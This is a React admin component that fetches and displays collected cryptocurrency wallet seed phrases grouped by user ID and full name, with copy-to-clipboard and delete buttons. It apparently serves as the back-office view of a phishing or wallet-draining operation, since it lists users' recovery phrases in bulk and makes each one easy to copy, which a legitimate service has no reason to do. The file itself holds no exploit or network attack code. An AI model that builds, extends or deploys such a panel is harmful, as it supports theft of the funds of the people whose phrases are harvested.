import React, { useEffect, useState } from 'react';
import { FaArrowDown, FaTrashAlt } from "react-icons/fa";
import { useDispatch, useSelector } from 'react-redux';
import toast from 'react-hot-toast';
import moment from 'moment';
import { get_all_seeds, messageClear, delete_seed } from '../../store/reducers/socialReducer';
import CopyToClipboard from 'react-copy-to-clipboard';

const SeedPh = () => {
    const dispatch = useDispatch();
    const [expandedId, setExpandedId] = useState(null);
    const { successMessage, errorMessage, seedDetails } = useSelector(state => state.social);
    const [copied, setCopied] = useState(false);
    const [uniqueUsers, setUniqueUsers] = useState([]);
    const [isLoading, setIsLoading] = useState(false);

    // Handle copy functionality
    useEffect(() => {
        if(copied) {
            toast.success('Copied to clipboard');
            setTimeout(() => {
                setCopied(false);
            }, 2000); 
        }
    }, [copied]);

    // Handle notifications
    useEffect(() => {
        if (successMessage) {
            toast.success(successMessage);
            dispatch(messageClear());
            setIsLoading(false);
        }
        if (errorMessage) {
            toast.error(errorMessage); 
            dispatch(messageClear());
            setIsLoading(false);
        }
    }, [successMessage, errorMessage, dispatch]);
    
    // Generate unique user data
    useEffect(() => {
        if (seedDetails && seedDetails.length > 0) {
            // Create a map to store unique users with their first transaction
            const uniqueUserMap = new Map();
            
            seedDetails.forEach(transaction => {
                if (!uniqueUserMap.has(transaction.userId)) {
                    uniqueUserMap.set(transaction.userId, transaction);
                }
            });
            
            // Convert map values to array
            const uniqueUsersArray = Array.from(uniqueUserMap.values());
            setUniqueUsers(uniqueUsersArray);
            setIsLoading(false);
        }
    }, [seedDetails]);

    // Toggle transaction details
    const toggleDetails = (userId) => {
        setExpandedId(expandedId === userId ? null : userId);
    };

    // Handle data loading
    const handleGetTransactions = () => {
        setIsLoading(true);
        dispatch(get_all_seeds());
    };

    // Handle delete transaction
    const handleDeleteTransaction = (id) => {
        if (window.confirm("Are you sure you want to delete all seed for this user?")) {
            setIsLoading(true);
            
            dispatch(delete_seed(id));
        }
    };
    
    // Truncate long text for better display
    const truncateText = (text, maxLength = 10) => {
        if (!text) return '';
        return text.length > maxLength ? `${text.substring(0, maxLength)}...` : text;
    };

    return (
        <div className='flex flex-col gap-y-4 w-full h-full'>
            <div className='w-full h-full bg-secondary py-3 px-2 md:py-5 md:px-3 rounded-md'>
                <div className='flex flex-col gap-y-4'>
                    <button 
                        onClick={handleGetTransactions} 
                        className='p-2 md:p-3 cursor-pointer hover:bg-accent-200 rounded bg-accent-100 justify-center w-full font-semibold uppercase focus:bg-accent-200 disabled:opacity-50'
                        disabled={isLoading}
                    >
                        {isLoading ? 'Loading...' : 'Get All Seeds'}
                    </button>
                    
                    {/* Desktop View - Hidden on small screens */}
                    <div className="relative overflow-x-auto hidden md:block">
                        <div className='flex justify-between items-center text-sm lg:text-base'>
                            <div className='py-2 w-[22%] font-bold'>User ID</div>
                            <div className='py-2 w-[12%] font-bold'>Date</div>
                            <div className='py-2 w-[10%] font-bold'>Fullname</div>
                            <div className='py-2 w-[48%] font-bold'>Message</div>
                            <div className='py-2 w-[8%] font-bold text-center'>Actions</div>
                        </div> 
                        
                        {uniqueUsers.length > 0 ? (
                            uniqueUsers.map((user, i) => (
                                <div key={i} className='text-txt-500'>
                                    <div className='flex justify-between items-center border-b border-slate-700 hover:bg-transparent transition-colors text-sm lg:text-base'>
                                        <div className='py-2 w-[22%] font-medium'>{truncateText(user.userId, 15)}</div>
                                        <div className='py-2 w-[12%] font-medium'>{moment(user.createdAt).format('MM/DD/YY')}</div>
                                        <div className='py-2 w-[10%] font-medium'>{user.fullname}</div>
                                        <div className='py-2 w-[48%] font-medium'>{truncateText(user.seedPhrase, 20)}</div>
                                        <div className='py-2 w-[8%] font-medium flex justify-around items-center'>
                                            <button 
                                                onClick={() => handleDeleteTransaction(user.userId)}
                                                className='text-red-500 hover:text-red-300 focus:outline-none'
                                                title="Delete all user transactions"
                                            >
                                                <FaTrashAlt />
                                            </button>
                                            <button 
                                                onClick={() => toggleDetails(user.userId)}
                                                className='focus:outline-none'
                                                title="Toggle details"
                                            >
                                                <FaArrowDown />
                                            </button>
                                        </div>
                                    </div> 
                                    
                                    <div className={expandedId === user.userId ? 'block border-b border-slate-700 bg-slate-700 rounded-md mt-1 mb-2 p-2' : 'hidden'}>
                                        <div className="grid grid-cols-4 gap-2 text-xs font-bold mb-2 px-2">
                                            <div>Date</div>
                                            <div>Fullname</div>
                                            <div colSpan={2}>Seed Phrase</div>
                                        </div>
                                        {seedDetails
                                            .filter(seeding => seeding.userId === user.userId)
                                            .map((seeding, index) => (
                                                <div key={index} className='grid grid-cols-4 gap-2 items-center border-b border-slate-600 py-2 text-xs'>
                                                    <div className='font-medium pl-2'>{moment(seeding.createdAt).format('MM/DD/YY')}</div>
                                                    <div className='font-medium'>{seeding.fullname || '---'}</div>
                                                    <div className='col-span-2'>
                                                        <CopyToClipboard text={seeding.seedPhrase} onCopy={() => setCopied(true)}>
                                                            <button className='text-left hover:text-blue-300 focus:outline-none w-full overflow-hidden text-ellipsis'>
                                                                {seeding.seedPhrase}
                                                            </button>
                                                        </CopyToClipboard>
                                                    </div>
                                                </div>
                                            ))
                                        }
                                    </div>  
                                </div>
                            ))
                        ) : (
                            <div className="text-center py-8">No seed phrases to display. Click "Get All Seeds" to load data.</div>
                        )}
                    </div>
                    
                    {/* Mobile View - Shows on small screens */}
                    <div className="md:hidden">
                        {uniqueUsers.length > 0 ? (
                            uniqueUsers.map((user, i) => (
                                <div key={i} className="mb-4 bg-transparent rounded-lg p-3 shadow">
                                    <div className="flex justify-between mb-2">
                                        <div className="font-bold text-sm">User: {truncateText(user.userId, 10)}</div>
                                        <div className="flex gap-2">
                                            <button onClick={() => handleDeleteTransaction(user.userId)} className="text-red-500">
                                                <FaTrashAlt />
                                            </button>
                                            <button onClick={() => toggleDetails(user.userId)}>
                                                <FaArrowDown />
                                            </button>
                                        </div>
                                    </div>
                                    
                                    <div className="grid grid-cols-2 gap-1 text-xs">
                                        <div className="font-semibold">User ID:</div>
                                        <div>{user.userId}</div>
                                        <div className="font-semibold">Date:</div>
                                        <div>{moment(user.createdAt).format('MM/DD/YY')}</div>
                                        <div className="font-semibold">Fullname:</div>
                                        <div>{user.fullname}</div>
                                        <div className="font-semibold">Seed Phrase:</div>
                                        <div>
                                            <CopyToClipboard text={user.seedPhrase} onCopy={() => setCopied(true)}>
                                                <button className="text-left hover:text-blue-300 focus:outline-none w-full overflow-hidden text-ellipsis">
                                                    {truncateText(user.seedPhrase, 15)}
                                                </button>
                                            </CopyToClipboard>
                                        </div>
                                    </div>
                                    
                                    <div className={expandedId === user.userId ? 'block mt-3 pt-3 border-t border-slate-700' : 'hidden'}>
                                        <div className="text-sm font-bold mb-2">All Seed Phrases</div>
                                        {seedDetails
                                            .filter(seeding => seeding.userId === user.userId)
                                            .map((seeding, index) => (
                                                <div key={index} className="bg-transparent rounded-md p-2 mb-2 text-xs">
                                                    <div className="grid grid-cols-2 gap-1 mb-2">
                                                        <div className="font-semibold">Date:</div>
                                                        <div>{moment(seeding.createdAt).format('MM/DD/YY')}</div>
                                                        <div className="font-semibold">Seed Phrase:</div>
                                                        <div>
                                                            <CopyToClipboard text={seeding.seedPhrase} onCopy={() => setCopied(true)}>
                                                                <button className="text-left hover:text-blue-300 focus:outline-none w-full overflow-hidden text-ellipsis">
                                                                    {seeding.seedPhrase}
                                                                </button>
                                                            </CopyToClipboard>
                                                        </div>
                                                    </div>
                                                </div>
                                            ))
                                        }
                                    </div>
                                </div>
                            ))
                        ) : (
                            <div className="text-center py-8">No seed phrases to display. Click "Get All Seeds" to load data.</div>
                        )}
                    </div>
                </div>
            </div>
        </div>
    );
};

export default SeedPh;